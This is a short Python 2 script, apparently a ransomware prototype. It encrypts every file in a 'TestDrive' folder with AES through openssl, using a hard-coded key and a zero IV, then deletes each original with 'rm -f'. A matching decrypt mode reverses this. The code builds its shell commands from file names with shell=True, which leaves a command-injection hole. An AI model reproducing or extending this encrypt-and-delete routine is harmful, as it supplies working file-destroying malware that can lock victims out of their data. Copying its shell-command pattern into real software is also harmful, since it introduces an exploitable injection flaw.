import os, random, struct, time, glob, sys, subprocess
key = '1364f0d31481ebc62afafbcf9778f39b'

def decrypt_file(encrypted, decrypted):
	subprocess.check_output("openssl enc -d -aes-128-cbc -K '%s' -iv '%s' -in '%s' -out '%s'" % (key, '0000000000000000', encrypted, decrypted), shell=True)

def encrypt_file(decrypted, encrypted):
	subprocess.check_output("openssl enc -e -aes-128-cbc -K '%s' -iv '%s' -in '%s' -out '%s'" % (key, '0000000000000000', decrypted, encrypted), shell=True)

function = raw_input("decrypt / encrypt: ")

if function == "decrypt":
    globs = glob.glob("TestDrive/*.enc") #will decrypt all 
else:
    globs = glob.glob("TestDrive/*") #will encrypt all
for x in globs:
    times = time.time()
    print "Starting %s" % x
    if function == "decrypt":
        cleanFile = ".".join(x.split(".")[:-1]) #for decrypt
        decrypt_file(x, cleanFile) #for decrypt
        print time.time() - times
        print "\033[92m[*] DECRYPTED [*]\033[0m \n%s -> %s" % (x, cleanFile)
    else:
        encrypt_file(x, "%s.enc" % x) #encrypt every file that glob satisfies with this key.
        print time.time() - times
        print "\033[91m[*] ENCRYPTED [*]\033[0m \n%s -> %s.enc" % (x, x)
    try:
        print "! Removing original [%s] !" % (x)
        os.system("rm -f '%s'" % x)
    except Exception, e:
        print "Error removing %s {[%s]}" % (x, e)



